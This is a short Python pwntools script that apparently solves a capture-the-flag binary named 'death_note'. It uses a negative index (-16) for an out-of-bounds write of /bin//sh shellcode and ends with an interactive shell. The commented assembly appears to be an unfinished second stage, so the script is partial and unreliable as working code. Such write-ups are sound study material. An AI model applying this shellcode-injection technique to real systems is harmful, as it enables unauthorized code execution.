#!/usr/bin/python3

from pwn import *

exe = ELF('death_note', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0804876d

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def create(idx, name):
        sla(b":", b"1")
        sla(b":", idx)
        sa(b":", name)
def free(idx):
        sla(b":", b"3")
        sla(b":", idx)
payload = "\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E"


create(b"-16", payload)
p.interactive()

# xor eax, eax
# inc eax
# inc eax
# inc eax
# inc eax
# xor ebx, ebx
# xor ecx, ecx
# add ecx, 0x0804a0a0
# xor edx, edx
# add edx, 0x50
# int 0x80